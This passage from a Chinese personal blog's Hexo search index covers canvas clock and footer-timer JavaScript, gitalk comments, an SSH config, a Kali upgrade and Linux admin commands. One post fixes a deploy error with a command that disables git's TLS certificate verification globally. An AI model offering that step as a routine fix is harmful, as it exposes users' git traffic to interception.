[1,1,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,1,1,0,0,0],</span><br><span class="line">                [0,1,1,0,0,0,0],</span><br><span class="line">                [1,1,0,0,0,0,0],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,1,1,1,1,1]</span><br><span class="line">            ],//2</span><br><span class="line">            [</span><br><span class="line">                [1,1,1,1,1,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,1,1,1,0,0],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,1,1,1,1,1,0]</span><br><span class="line">            ],//3</span><br><span class="line">            [</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,1,1,1,0],</span><br><span class="line">                [0,0,1,1,1,1,0],</span><br><span class="line">                [0,1,1,0,1,1,0],</span><br><span class="line">                [1,1,0,0,1,1,0],</span><br><span class="line">                [1,1,1,1,1,1,1],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,1,1,1,1]</span><br><span class="line">            ],//4</span><br><span class="line">            [</span><br><span class="line">                [1,1,1,1,1,1,1],</span><br><span class="line">                [1,1,0,0,0,0,0],</span><br><span class="line">                [1,1,0,0,0,0,0],</span><br><span class="line">                [1,1,1,1,1,1,0],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,1,1,1,1,1,0]</span><br><span class="line">            ],//5</span><br><span class="line">            [</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,1,1,0,0,0],</span><br><span class="line">                [0,1,1,0,0,0,0],</span><br><span class="line">                [1,1,0,0,0,0,0],</span><br><span class="line">                [1,1,0,1,1,1,0],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,1,1,1,1,1,0]</span><br><span class="line">            ],//6</span><br><span class="line">            [</span><br><span class="line">                [1,1,1,1,1,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,0,1,1,0,0,0],</span><br><span class="line">                [0,0,1,1,0,0,0],</span><br><span class="line">                [0,0,1,1,0,0,0],</span><br><span class="line">                [0,0,1,1,0,0,0]</span><br><span class="line">            ],//7</span><br><span class="line">            [</span><br><span class="line">                [0,1,1,1,1,1,0],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,1,1,1,1,1,0],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,1,1,1,1,1,0]</span><br><span class="line">            ],//8</span><br><span class="line">            [</span><br><span class="line">                [0,1,1,1,1,1,0],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [1,1,0,0,0,1,1],</span><br><span class="line">                [0,1,1,1,0,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,0,1,1],</span><br><span class="line">                [0,0,0,0,1,1,0],</span><br><span class="line">                [0,0,0,1,1,0,0],</span><br><span class="line">                [0,1,1,0,0,0,0]</span><br><span class="line">            ],//9</span><br><span class="line">            [</span><br><span class="line">                [0,0,0,0],</span><br><span class="line">                [0,0,0,0],</span><br><span class="line">                [0,1,1,0],</span><br><span class="line">                [0,1,1,0],</span><br><span class="line">                [0,0,0,0],</span><br><span class="line">                [0,0,0,0],</span><br><span class="line">                [0,1,1,0],</span><br><span class="line">                [0,1,1,0],</span><br><span class="line">                [0,0,0,0],</span><br><span class="line">                [0,0,0,0]</span><br><span class="line">            ]//:</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">    function drawDatetime(cxt)&#123;</span><br><span class="line">        var nums = [];</span><br><span class="line"></span><br><span class="line">        context.fillStyle=&quot;#005eac&quot;</span><br><span class="line">        var date = new Date();</span><br><span class="line">        var offsetX = 70, offsetY = 30;</span><br><span class="line">        var hours = date.getHours();</span><br><span class="line">        var num1 = Math.floor(hours/10);</span><br><span class="line">        var num2 = hours%10;</span><br><span class="line">        nums.push(&#123;num: num1&#125;);</span><br><span class="line">        nums.push(&#123;num: num2&#125;);</span><br><span class="line">        nums.push(&#123;num: 10&#125;); //冒号</span><br><span class="line">        var minutes = date.getMinutes();</span><br><span class="line">        var num1 = Math.floor(minutes/10);</span><br><span class="line">        var num2 = minutes%10;</span><br><span class="line">        nums.push(&#123;num: num1&#125;);</span><br><span class="line">        nums.push(&#123;num: num2&#125;);</span><br><span class="line">        nums.push(&#123;num: 10&#125;); //冒号</span><br><span class="line">        var seconds = date.getSeconds();</span><br><span class="line">        var num1 = Math.floor(seconds/10);</span><br><span class="line">        var num2 = seconds%10;</span><br><span class="line">        nums.push(&#123;num: num1&#125;);</span><br><span class="line">        nums.push(&#123;num: num2&#125;);</span><br><span class="line"></span><br><span class="line">        for(var x = 0;x&lt;nums.length;x++)&#123;</span><br><span class="line">            nums[x].offsetX = offsetX;</span><br><span class="line">            offsetX = drawSingleNumber(offsetX,offsetY, nums[x].num,cxt);</span><br><span class="line">            //两个数字连一块，应该间隔一些距离</span><br><span class="line">            if(x&lt;nums.length-1)&#123;</span><br><span class="line">                if((nums[x].num!=10) &amp;&amp;(nums[x+1].num!=10))&#123;</span><br><span class="line">                    offsetX+=NUMBER_GAP;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //说明这是初始化</span><br><span class="line">        if(currentNums.length ==0)&#123;</span><br><span class="line">            currentNums = nums;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            //进行比较</span><br><span class="line">            for(var index = 0;index&lt;currentNums.length;index++)&#123;</span><br><span class="line">                if(currentNums[index].num!=nums[index].num)&#123;</span><br><span class="line">                    //不一样时，添加彩色小球</span><br><span class="line">                    addBalls(nums[index]);</span><br><span class="line">                    currentNums[index].num=nums[index].num;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        renderBalls(cxt);</span><br><span class="line">        updateBalls();</span><br><span class="line"></span><br><span class="line">        return date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addBalls (item) &#123;</span><br><span class="line">        var num = item.num;</span><br><span class="line">        var numMatrix = digit[num];</span><br><span class="line">        for(var y = 0;y&lt;numMatrix.length;y++)&#123;</span><br><span class="line">            for(var x = 0;x&lt;numMatrix[y].length;x++)&#123;</span><br><span class="line">                if(numMatrix[y][x]==1)&#123;</span><br><span class="line">                    var ball=&#123;</span><br><span class="line">                        offsetX:item.offsetX+RADIUS+RADIUS*2*x,</span><br><span class="line">                        offsetY:30+RADIUS+RADIUS*2*y,</span><br><span class="line">                        color:colors[Math.floor(Math.random()*colors.length)],</span><br><span class="line">                        g:1.5+Math.random(),</span><br><span class="line">                        vx:Math.pow(-1, Math.ceil(Math.random()*10))*4+Math.random(),</span><br><span class="line">                        vy:-5</span><br><span class="line">                    &#125;</span><br><span class="line">                    balls.push(ball);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renderBalls(cxt)&#123;</span><br><span class="line">        for(var index = 0;index&lt;balls.length;index++)&#123;</span><br><span class="line">            cxt.beginPath();</span><br><span class="line">            cxt.fillStyle=balls[index].color;</span><br><span class="line">            cxt.arc(balls[index].offsetX, balls[index].offsetY, RADIUS, 0, 2*Math.PI);</span><br><span class="line">            cxt.fill();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function updateBalls () &#123;</span><br><span class="line">        var i =0;</span><br><span class="line">        for(var index = 0;index&lt;balls.length;index++)&#123;</span><br><span class="line">            var ball = balls[index];</span><br><span class="line">            ball.offsetX += ball.vx;</span><br><span class="line">            ball.offsetY += ball.vy;</span><br><span class="line">            ball.vy+=ball.g;</span><br><span class="line">            if(ball.offsetY &gt; (WINDOW_HEIGHT-RADIUS))&#123;</span><br><span class="line">                ball.offsetY= WINDOW_HEIGHT-RADIUS;</span><br><span class="line">                ball.vy=-ball.vy*u;</span><br><span class="line">            &#125;</span><br><span class="line">            if(ball.offsetX&gt;RADIUS&amp;&amp;ball.offsetX&lt;(WINDOW_WIDTH-RADIUS))&#123;</span><br><span class="line"></span><br><span class="line">                balls[i]=balls[index];</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //去除出边界的球</span><br><span class="line">        for(;i&lt;balls.length;i++)&#123;</span><br><span class="line">            balls.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function drawSingleNumber(offsetX, offsetY, num, cxt)&#123;</span><br><span class="line">        var numMatrix = digit[num];</span><br><span class="line">        for(var y = 0;y&lt;numMatrix.length;y++)&#123;</span><br><span class="line">            for(var x = 0;x&lt;numMatrix[y].length;x++)&#123;</span><br><span class="line">                if(numMatrix[y][x]==1)&#123;</span><br><span class="line">                    cxt.beginPath();</span><br><span class="line">                    cxt.arc(offsetX+RADIUS+RADIUS*2*x,offsetY+RADIUS+RADIUS*2*y,RADIUS,0,2*Math.PI);</span><br><span class="line">                    cxt.fill();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cxt.beginPath();</span><br><span class="line">        offsetX += numMatrix[0].length*RADIUS*2;</span><br><span class="line">        return offsetX;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var canvas = document.getElementById(&quot;canvas&quot;);</span><br><span class="line">    canvas.width=WINDOW_WIDTH;</span><br><span class="line">    canvas.height=WINDOW_HEIGHT;</span><br><span class="line">    context = canvas.getContext(&quot;2d&quot;);</span><br><span class="line"></span><br><span class="line">    //记录当前绘制的时刻</span><br><span class="line">    var currentDate = new Date();</span><br><span class="line"></span><br><span class="line">    setInterval(function()&#123;</span><br><span class="line">        //清空整个Canvas，重新绘制内容</span><br><span class="line">        context.clearRect(0, 0, context.canvas.width, context.canvas.height);</span><br><span class="line">        drawDatetime(context);</span><br><span class="line">    &#125;, 50)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

</p>
</details>

<ol start="3">
<li>效果图<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcns72p23sj31f60u0u00.jpg" alt="image.png"></li>
</ol>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://jrbcode.github.io/posts/63c4b34f.html">https://jrbcode.github.io/posts/63c4b34f.html</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>设置canvas粒子时钟</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客设置gitalk评论功能</title>
    <url>//posts/ZH-CN/Hexo_Gitalk_Comment.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>看到大家的博客做得那么好看，各种功能丰富多彩的，心里甚是羡慕啊。评论功能怎么也不能少滴！装13和交流的桥梁！<br>hexo+next主题的博客，可以使用的评论插件很多，包括valine、来必力、多说、gitalk……等等。尝试弄过来必力、gitment，放弃了。来必力是韩国的，我注册这道坎就没过，不知道为啥，填写的邮件验证码老不对，国内访问来必力官网的网速也是堪忧，遂放弃之。弄gitment的过程也是心酸，不晓得为啥，就是装不上这个插件，在网上各个角落找锦囊，最后放弃。最后终于找到了最心水的评论插件，那就是gitalk。<br>为啥用gitalk？这个博客我就是基于github做的，gitalk评论的内容将显示到github仓库的issue里面，像图中这样。一站式服务不挺好吗，所有东西一股脑交给github，放心、省心。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gaylnjsmd1j310d0otdi7.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>简单。分三步。<br><strong>第一步</strong>：在github上，创建一个应用，访问链接（<a href="https://github.com/settings/applications/new）">https://github.com/settings/applications/new）</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gaylwwvsuqj30mv0jo751.jpg" alt="image.png"><br>创建成功之后，可以看到ClientID和Client Secret,后面的步骤会用到。<br><strong>第二步</strong>：设置next主题配置文件_config.yml，开启gitalk功能，像图中这么设置，ClientID和Client Secret就是上一步中我们看到的那两串，复制到这里就行了。文件位置：博客目录\themes\next<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gaym69857uj315i0igaeh.jpg" alt="image.png"><br>注意repo名称一定要与github的仓库名称保持一致，否则评论页面会出现这样的报错：<br><strong>ERROR NOT FOUND</strong><br><strong>第三步</strong>：初始化评论功能，每一篇博客发布之后，都需要博客的主人做一次初始化操作，否则就会出现这样的温馨提示：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gaymfswwqgj30vo08ztk8.jpg" alt="image.png"></p>
<p>如果不想每发一条博客就自己给自己评论一条，有方法可以自动初始化评论，网上很多教程。我暂时用不到这个功能，因为喜欢给自己评论……</p>
<hr>
<p>手动初始化还是讲窍门的，在github处于登录状态的浏览器中，访问自己的博客，发表评论即可。一定是要在github处于登录状态时，初始化操作才能圆满完成。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.yanbinghu.com/2017/10/20/46383.html">https://www.yanbinghu.com/2017/10/20/46383.html</a><br><a href="https://juejin.im/post/5d7389be51882573fd73dde4">https://juejin.im/post/5d7389be51882573fd73dde4</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客设置评论功能</tag>
        <tag>gitalk</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客美化url格式</title>
    <url>//posts/ZH-CN/Hexo_Permalink_Beautiful.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚刚改的那种格式，也不太好看，url里面含有中文，看起来始终不是那么回事。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么美化url格式"><a href="#怎么美化url格式" class="headerlink" title="怎么美化url格式"></a>怎么美化url格式</h2><p>主要就是更改permalink的格式。<br>我们改为这样：（修改站点配置文件<code>C:\Users\admin\myBlog\_config.yml</code>）<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0izo5of8j30p90g8wg1.jpg" alt="image.png"><br>下一步，就是体力活了，我给所有文章都加上了<code>urlname</code>这项配置，如图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0l8xqoinj30ka091glv.jpg" alt="image.png"></p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>弄好之后，url显示就是酱紫的。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0ld4pg5yj31f60u0aul.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhangjiejun.com/posts/URL_optimization_in_hexo/">参考文章</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>url格式美化</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客设置页面底部显示博客运行时间</title>
    <url>//posts/ZH-CN/Hexo_Bottom_Runingtime.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>给博客页面底部设置网站运行时间。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>进入目录<code>C:\Users\admin\myBlog\themes\next\layout\_partials</code>修改文件<code>footer.swig</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcnrpm39btj31f60u044y.jpg" alt="image.png"></p>
<details><summary>点击展开代码内容</summary>
<p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;</span><br><span class="line">&lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var now = new Date();</span><br><span class="line">    function createtime() &#123;</span><br><span class="line">        var grt= new Date(&quot;09/15/2019 15:13:14&quot;);//此处修改你的建站时间或者网站上线时间</span><br><span class="line">        now.setTime(now.getTime()+250);</span><br><span class="line">        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);</span><br><span class="line">        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);</span><br><span class="line">        if(String(hnum).length ==1 )&#123;hnum = &quot;0&quot; + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);</span><br><span class="line">        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = &quot;0&quot; + mnum;&#125;</span><br><span class="line">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);</span><br><span class="line">        snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = &quot;0&quot; + snum;&#125;</span><br><span class="line">        document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;;</span><br><span class="line">        document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">setInterval(&quot;createtime()&quot;,250);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</p>
</details>

<p>效果图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcns85vhddj31f60u0b29.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://jrbcode.github.io/posts/63c4b34f.html">https://jrbcode.github.io/posts/63c4b34f.html</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>页面底部显示博客运行时间</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客部署失败-报错SSL证书问题</title>
    <url>//posts/ZH-CN/Hexo_SSL_Error.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>今天晚上部署博客，突然遇到这个错误，由于ssl证书的问题，导致部署失败。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>用了一个临时方法解决。<br>输入命令行：<code>git config --global http.sslVerify false</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrk2wweimj30p90g80ud.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.jianshu.com/p/a743b808ecce">https://www.jianshu.com/p/a743b808ecce</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>hexo博客部署失败</tag>
        <tag>报错SSL证书问题</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客设置首页折叠</title>
    <url>//posts/ZH-CN/Hexo_FirstPage_Fold.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>看到别人的博客首页可以折叠全文，作为强迫症，必须拥有这种简洁的界面！</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>在需要折叠的文本之前加入占位符more就行了，超简单。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gayfqtn3djj30kr0brq3b.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="http://www.raomengyang.com/2016/06/26/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/">http://www.raomengyang.com/2016/06/26/hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客首页折叠</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo突然无法deploy报错connection timeout</title>
    <url>//posts/ZH-CN/hexo-deploy-failed-connection-timeout.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不晓得为啥，hexo突然无法deploy本地的文章，头疼……搁置了几天，今天终于腾出精力来google。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/06/17/image411af13ac4a6e986.png" alt="image411af13ac4a6e986.png"></p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>因为电脑本地的ssh目录缺失了config文件。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/17/imageae93b428e4304472.png" alt="imageae93b428e4304472.png"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>自己创建缺失的config文件：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/17/imageae93b428e4304472.png" alt="imageae93b428e4304472.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User XXX@gmail.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考了<a href="https://blog.csdn.net/MBuger/article/details/70226712">这篇文章</a></p>
<hr>
<p>真的是，不晓得为啥就出现这样的问题，本来还以为是github被墙了，看来是我想复杂了。但是话说，我的config文件是咋缺失的……</p>
]]></content>
      <categories>
        <category>hexo博客</category>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>connection timeout</tag>
      </tags>
  </entry>
  <entry>
    <title>kali进行源码包升级</title>
    <url>//posts/ZH-CN/Kali_Upgrade.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>wpscan使用的时候，报错<code>403</code>：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0yv5qi17j30ka0d8777.jpg" alt="image.png"><br>在网上找了很多，还是没有找到有效的方法。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p>试一下升级kali源码，看能不能把wpscan升级成功。<br>升级方法参考了<a href="https://www.jianshu.com/p/80fa0bfcc9b6">这篇文章</a></p>
<blockquote>
<ol>
<li>apt-get update</li>
<li>apt-get upgrade</li>
<li>apt-get dist-upgrade</li>
<li>apt-get autoclean //清理旧版本的软件缓存</li>
<li>apt-get clean //清理所有软件缓存</li>
<li>apt-get autoremove //删除系统不再使用的孤立软件</li>
</ol>
</blockquote>
<p>dist-upgrade 会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。</p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali日常</tag>
        <tag>源码包升级</tag>
      </tags>
  </entry>
  <entry>
    <title>linux中的wheel用户组</title>
    <url>//posts/ZH-CN/Linux-wheel-group-sudo-su.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次接触到wheel用户组。网上许多资料说，不在wheel用户组的用户无法su登录到root用户，经过亲身测试，这种说法是不对的。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="wheel用户组"><a href="#wheel用户组" class="headerlink" title="wheel用户组"></a>wheel用户组</h2><p>wheel用户组的id值是10。<br><a href="https://v2ray.dana5haw.com:8008/image/Zos7"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image91a90f2d72a75f06.png" alt="image91a90f2d72a75f06.png"></a><br>经测试，不在wheel组的用户，可以su登录到root用户。<br><a href="https://v2ray.dana5haw.com:8008/image/Z3dY"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/imagebd498e4fd8deced2.png" alt="imagebd498e4fd8deced2.png"></a></p>
<h2 id="不在wheel组无法执行sudo权限"><a href="#不在wheel组无法执行sudo权限" class="headerlink" title="不在wheel组无法执行sudo权限"></a>不在wheel组无法执行sudo权限</h2><p>不在wheel组的用户，无法执行sudo权限。<br><a href="https://v2ray.dana5haw.com:8008/image/Zcox"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/imagec0afbd8ef7a31a77.png" alt="imagec0afbd8ef7a31a77.png"></a></p>
<h2 id="将普通用户添加到wheel用户组"><a href="#将普通用户添加到wheel用户组" class="headerlink" title="将普通用户添加到wheel用户组"></a>将普通用户添加到wheel用户组</h2><p>命令语法：<code>usermod -G wheel 用户名</code><br><a href="https://v2ray.dana5haw.com:8008/image/Z0XS"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/10/image2243ef85ece1ed74.png" alt="image2243ef85ece1ed74.png"></a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>将普通用户添加到wheel用户组，参考这篇<a href="https://blog.csdn.net/cbbbc/article/details/51712913">文章</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>wheel用户组</tag>
        <tag>su</tag>
        <tag>sudo</tag>
      </tags>
  </entry>
  <entry>
    <title>linux命令-查询TCP并发数</title>
    <url>//posts/ZH-CN/Linux_TCP_Mux.html</url>
    <content><![CDATA[<h2 id="查询TCP并发数"><a href="#查询TCP并发数" class="headerlink" title="查询TCP并发数"></a>查询TCP并发数</h2><ol>
<li>方法一：使用ss命令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss -an</span><br></pre></td></tr></table></figure>
举例：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@dana ~]# ss -an |wc -l</span><br><span class="line">8586</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p><escape> <span id="more"></span></escape></p>
<ol start="2">
<li>方法二：使用netstat命令</li>
</ol>
<ul>
<li>查询TCP数<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -n |wc -l</span><br></pre></td></tr></table></figure>
举例：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@dana ~]# netstat -ant |wc -l</span><br><span class="line">7897</span><br></pre></td></tr></table></figure></li>
<li>查询详情TCP连接<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -n |awk &#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a,S[a]&#125;&#x27;</span><br></pre></td></tr></table></figure>
举例：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@dana ~]# netstat -n |awk &#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a,S[a]&#125;&#x27;</span><br><span class="line">LAST_ACK 408</span><br><span class="line">SYN_RECV 7</span><br><span class="line">CLOSE_WAIT 5</span><br><span class="line">ESTABLISHED 1837</span><br><span class="line">FIN_WAIT1 166</span><br><span class="line">FIN_WAIT2 37</span><br><span class="line">CLOSING 52</span><br><span class="line">TIME_WAIT 5037</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.cnblogs.com/peida/archive/2013/03/11/2953420.html">https://www.cnblogs.com/peida/archive/2013/03/11/2953420.html</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>TCP并发数</tag>
      </tags>
  </entry>
  <entry>
    <title>linux批量修改文件后缀</title>
    <url>//posts/ZH-CN/linux-modify-file-suffix.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>批量修改目录下面的所有文件名后缀。</p>
